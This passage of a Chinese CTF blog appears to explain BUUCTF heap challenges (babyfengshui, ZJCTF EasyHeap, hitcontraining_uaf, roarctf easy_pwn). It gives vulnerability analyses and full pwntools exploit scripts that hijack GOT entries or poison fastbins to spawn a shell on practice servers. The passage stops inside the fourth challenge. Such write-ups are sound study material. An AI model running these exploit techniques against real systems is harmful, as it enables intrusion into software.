href=\"#babyfengshui-33c3-2016\" class=\"headerlink\" title=\"babyfengshui_33c3_2016\"></a>babyfengshui_33c3_2016</h2><p>四个功能的堆</p>\n<ol>\n<li>增</li>\n<li>删</li>\n<li>改</li>\n<li>查</li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194459201.png\" alt=\"image-20210304194459201\"></p>\n<blockquote>\n<p>增</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194521206.png\" alt=\"image-20210304194521206\"></p>\n<blockquote>\n<p>删</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194556700.png\" alt=\"image-20210304194556700\"></p>\n<blockquote>\n<p>改</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194612347.png\" alt=\"image-20210304194612347\"></p>\n<blockquote>\n<p>查</p>\n</blockquote>\n<p>主要堆结构</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304202014812.png\" alt=\"image-20210304202014812\"></p>\n<h3 id=\"漏洞点\"><a href=\"#漏洞点\" class=\"headerlink\" title=\"漏洞点\"></a>漏洞点</h3><ol>\n<li><p>这里判断条件有问题</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305092048534.png\" alt=\"image-20210305092048534\"></p>\n</li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305094604106.png\" alt=\"image-20210305094604106\"></p>\n<p>可以看上面两张图片，如果第一个堆块和第二个堆块相隔较远，那么我们就可以中间任意字节溢出</p>\n<h3 id=\"思路：-2\"><a href=\"#思路：-2\" class=\"headerlink\" title=\"思路：\"></a>思路：</h3><ol>\n<li>我们知道每创建一个用户就会分配两个堆块，想泄露基地址这里主要用打印函数，可以打印对应地址上的内容。所以我们只需要申请几个堆块，并把0x80这种堆块中指向size的指针改为got表上任意一个值即可泄露。</li>\n<li>那么第二个问题是怎么任意字节溢出，这里主要用到unsorted bin合并。如果两个堆块释放，合并，再分配（分配大小正好等于size堆块和0x80堆块之和），之后的0x80就放在了最后面。意味着我们可以中间任意字节溢出。</li>\n</ol>\n<h3 id=\"技巧：-2\"><a href=\"#技巧：-2\" class=\"headerlink\" title=\"技巧：\"></a>技巧：</h3><ol>\n<li>灵活利用堆指针</li>\n<li>改got表</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.13\",)</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26600</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.13\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Add</span><span class=\"params\">(size, length, text)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'0'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"description: \"</span>, str(size))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"name: \"</span>, <span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"length: \"</span>, str(length))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"text: \"</span>, text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Del</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'1'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Dis</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'2'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Upd</span><span class=\"params\">(index, length, text)</span>:</span></span><br><span class=\"line\">\tsla(<span class=\"string\">\"Action: \"</span>, <span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">\"index: \"</span>, str(index))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"length: \"</span>, str(length))</span><br><span class=\"line\">\tsla(<span class=\"string\">\"text: \"</span>, text)</span><br><span class=\"line\">Add(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"string\">'AAAA'</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">Add(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"string\">'BBBB'</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">Add(<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"string\">\"/bin/sh\\x00\"</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">Del(<span class=\"number\">0</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">Add(<span class=\"number\">0x100</span>, <span class=\"number\">0x19c</span>, <span class=\"string\">\"A\"</span>*<span class=\"number\">0x198</span>+p32(elf.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">Dis(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"description: \"</span>)</span><br><span class=\"line\">free = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'free'</span>,free)</span><br><span class=\"line\">libc_base = free - libc.dump(<span class=\"string\">'free'</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>) </span><br><span class=\"line\"><span class=\"comment\"># libc_base = free - libc.sym[\"free\"]</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># sh = libc_base + next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\">Upd(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(sys))</span><br><span class=\"line\">leak(<span class=\"string\">\"sys\"</span>,sys)</span><br><span class=\"line\">Del(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ZJCTF-2019-EasyHeap\"><a href=\"#ZJCTF-2019-EasyHeap\" class=\"headerlink\" title=\"[ZJCTF 2019]EasyHeap\"></a>[ZJCTF 2019]EasyHeap</h2><p>三个功能的堆</p>\n<ol>\n<li>增</li>\n<li>删</li>\n<li>改</li>\n</ol>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193458599.png\" alt=\"image-20210305193458599\"></p>\n<blockquote>\n<p>add</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193516175.png\" alt=\"image-20210305193516175\"></p>\n<blockquote>\n<p>del</p>\n</blockquote>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193536046.png\" alt=\"image-20210305193536046\"></p>\n<blockquote>\n<p>edit</p>\n</blockquote>\n<h3 id=\"漏洞点：-2\"><a href=\"#漏洞点：-2\" class=\"headerlink\" title=\"漏洞点：\"></a>漏洞点：</h3><ol>\n<li>edit中size无限字节溢出</li>\n</ol>\n<h3 id=\"思路：-3\"><a href=\"#思路：-3\" class=\"headerlink\" title=\"思路：\"></a>思路：</h3><ol>\n<li>有system我们可以不泄露libc，直接利用unsorted bin attack将magic数值改大即可，但这种方法在buu上不适用</li>\n<li>我们说更普遍的方法，有heaparrary，got表可写，我们想到的就是劫持got表</li>\n<li>第一步，先分配3个堆块，第一个等会来写got表，第二个写/bin/sh，第三个是用来劫持fd指针。首先释放第三个，然后改fd指针，将伪造chunk到heaparray附近。</li>\n<li>第二步，申请两个堆块，其中伪造chunk已经在heaparray附近，我们更改其heaparray[0]为free.got</li>\n<li>第三步，修改第1个堆块的内容为sysytem</li>\n<li>第四步，释放第2个堆块</li>\n</ol>\n<h3 id=\"技巧：-3\"><a href=\"#技巧：-3\" class=\"headerlink\" title=\"技巧：\"></a>技巧：</h3><ol>\n<li>修改堆管理指针为free.got</li>\n<li>劫持free.got表</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.14\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25957</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.14\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Size of Heap : \"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Content of heap:\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"SuccessFul\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Size of Heap : \"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Content of heap : \"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"A\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"B\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">\"C\"</span>*<span class=\"number\">0x68</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'/bin/sh\\x00'</span> + <span class=\"string\">'a'</span> * <span class=\"number\">0x60</span> + p64(<span class=\"number\">0x71</span>) + p64(<span class=\"number\">0x6020b0</span><span class=\"number\">-3</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,len(payload),payload)</span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">'AAAA'</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">create(<span class=\"number\">0x68</span>,<span class=\"string\">'DDDD'</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">3</span> + p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,len(payload),payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,len(payload),payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hitcontraining-uaf\"><a href=\"#hitcontraining-uaf\" class=\"headerlink\" title=\"hitcontraining_uaf\"></a>hitcontraining_uaf</h2><p>题重复了，uaf</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29579</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.15\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">prt</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">magic = elf.sym[<span class=\"string\">\"magic\"</span>]</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.15\")</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'B'</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic))</span><br><span class=\"line\">prt(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"roarctf-2019-easy-pwn\"><a href=\"#roarctf-2019-easy-pwn\" class=\"headerlink\" title=\"roarctf_2019_easy_pwn\"></a>roarctf_2019_easy_pwn</h2><p>四个功能的堆</p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221232736.png\" alt=\"image-20210307221232736\"></li>\n<li>edit<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221248396.png\" alt=\"image-20210307221248396\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221303827.png\" alt=\"image-20210307221303827\"></li>\n<li>print<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221324705.png\" alt=\"image-20210307221324705\"></li>\n</ol>\n<h3 id=\"漏洞点：-3\"><a href=\"#漏洞点：-3\" class=\"headerlink\" title=\"漏洞点：\"></a>漏洞点：</h3><p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221400661.png\" alt=\"image-20210307221400661\"></p>\n<p>这里有off by one漏洞</p>\n<h3 id=\"思路：-4\"><a href=\"#思路：-4\" class=\"headerlink\" title=\"思路：\"></a>思路：</h3><ol>\n<li>和vn的那道题差不多，思路就是利用unsorted bin来获取基地址。</li>\n<li>伪造chunk到malloc附近，利用realloc_hook加malloc_hook来getshell</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span 